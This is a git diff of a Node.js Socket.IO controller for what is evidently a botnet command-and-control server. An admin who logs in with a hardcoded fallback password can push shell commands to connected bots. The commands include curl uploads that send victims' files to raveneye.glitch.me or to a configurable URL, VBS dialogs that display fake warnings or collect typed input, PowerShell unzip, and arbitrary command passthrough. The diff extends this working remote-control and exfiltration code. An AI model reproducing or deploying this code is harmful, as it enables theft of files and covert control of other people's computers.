@@ -1,10 +1,9 @@
-// controllers/botController.js
 const fs = require("fs");
 const path = require("path");
 
 let BotList = [];
 let adminID = null;
-const password = process.env.BOT_PASSWORD || '3760'; // Use environment variable for password
+const password = process.env.BOT_PASSWORD || '3760';
 
 const uploadedFilesPath = path.join(__dirname, "..", "uploadedFiles.json");
 
@@ -28,15 +27,10 @@ const getUploadedFiles = () => {
   }
 };
 
-const handleCommand = (data, socket, io) => {
+const handleCommand = (data, socket, io, upurl) => {
   logCommand(data);
 
-  if (
-    data.cmd === "uplist" ||
-    data.cmd === "downlist" ||
-    data.cmd === "downld" ||
-    data.cmd === "upld"
-  ) {
+  if (data.cmd === "uplist" || data.cmd === "upld") {
     if (socket.id !== adminID) {
       io.to(socket.id).emit("BotReply", "Access Denied!");
       return;
@@ -57,12 +51,6 @@ const handleCommand = (data, socket, io) => {
     return;
   }
 
-  if (data.cmd === "downlist") {
-    const files = getFilesInDirectory(path.join(__dirname, "..", "downloads"));
-    io.to(socket.id).emit("BotReply", `Downloaded files:\n${files.join("\n")}`);
-    return;
-  }
-
   if (data.user === "$BotMaster" && data.cmd === password) {
     adminID = socket.id;
     io.to(adminID).emit("BotList", BotList);
@@ -75,53 +63,40 @@ const handleCommand = (data, socket, io) => {
       const botres = `${data.user} :\n${data.cmd}`;
       io.to(adminID).emit("BotReply", botres);
     } else {
-      if (
-        data.target.length === 0 &&
-        data.cmd != "downlist" &&
-        data.cmd != "uplist" &&
-        data.cmd != "downld"
-      ) {
+      if (data.target.length === 0 && data.cmd !== "uplist" && data.cmd !== "upld") {
         io.to(adminID).emit("BotReply", "No Bots Online or selected!");
       } else {
         data.target.forEach((target) => {
           const bot = BotList.find((object) => object.botName === target);
           if (bot) {
-            // Command logic for bots
             if (data.cmd.startsWith("upld")) {
-              let upfiles = data.cmd.split("&&");
-              upfiles.shift();
-              for (let i = 0; i < upfiles.length; i++) {
-                upfiles[i] = '-F "file=@' + upfiles[i] + '"';
-              }
-              let uploadFileNames = upfiles.join(" ");
+              const filePath = data.cmd.split(" ")[1];
               io.to(bot.socketId).emit(
                 "cmd",
-                "curl -X POST " +
-                  uploadFileNames +
-                  " https://raveneye.glitch.me/upload"
+                `curl -X POST -F "file=@${filePath}" https://raveneye.glitch.me/upload`
+              );
+            }else if (data.cmd.startsWith("localup")) {
+              const filePath = data.cmd.split(" ")[1];
+              io.to(bot.socketId).emit(
+                "cmd",
+                `curl -X POST -F "file=@${filePath}" ${upurl}`
               );
             } else if (data.cmd.startsWith("warn ")) {
               let warningmsg = data.cmd.split(" ").slice(1).join(" ");
               io.to(bot.socketId).emit(
                 "cmd",
-                'echo MsgBox "' +
-                  warningmsg +
-                  '", 48, "Warning" > temp.vbs && temp.vbs && del temp.vbs'
+                `echo MsgBox "${warningmsg}", 48, "Warning" > temp.vbs && temp.vbs && del temp.vbs`
               );
             } else if (data.cmd.startsWith("unzip ")) {
               let unzipmsg = data.cmd.split(" ");
               unzipmsg.shift();
               let zipmsg =
-                `powershell -command \"Expand-Archive -Path '` +
-                unzipmsg[0] +
-                `' -DestinationPath '.'"`;
+                `powershell -command "Expand-Archive -Path '${unzipmsg[0]}' -DestinationPath '.'"`;
               io.to(bot.socketId).emit("cmd", zipmsg);
             } else if (data.cmd.startsWith("ask ")) {
               let question = data.cmd.split(" ").slice(1).join(" ");
               let questString =
-                `echo input = InputBox("` +
-                question +
-                `:", "Input Prompt") > temp.vbs && echo Set fso = CreateObject("Scripting.FileSystemObject") >> temp.vbs && echo Set file = fso.CreateTextFile("output.txt", True) >> temp.vbs && echo file.WriteLine(input) >> temp.vbs && echo file.Close >> temp.vbs && cscript //nologo temp.vbs && del temp.vbs && type output.txt && del output.txt`;
+                `echo input = InputBox("${question}", "Input Prompt") > temp.vbs && echo Set fso = CreateObject("Scripting.FileSystemObject") >> temp.vbs && echo Set file = fso.CreateTextFile("output.txt", True) >> temp.vbs && echo file.WriteLine(input) >> temp.vbs && echo file.Close >> temp.vbs && cscript //nologo temp.vbs && del temp.vbs && type output.txt && del output.txt`;
               io.to(bot.socketId).emit("cmd", questString);
             } else {
               io.to(bot.socketId).emit("cmd", data.cmd);
@@ -135,7 +110,7 @@ const handleCommand = (data, socket, io) => {
   }
 };
 
-const handleBotConnection = (socket, io) => {
+const handleBotConnection = (socket, io, upurl) => {
   socket.on("intro", (user) => {
     if (user !== "$BotMaster") {
       BotList.push({ botName: user, socketId: socket.id });
@@ -145,7 +120,7 @@ const handleBotConnection = (socket, io) => {
     }
   });
 
-  socket.on("command", (data) => handleCommand(data, socket, io));
+  socket.on("command", (data) => handleCommand(data, socket, io, upurl));
 
   socket.on("disconnect", () => {
     if (socket.id !== adminID) {
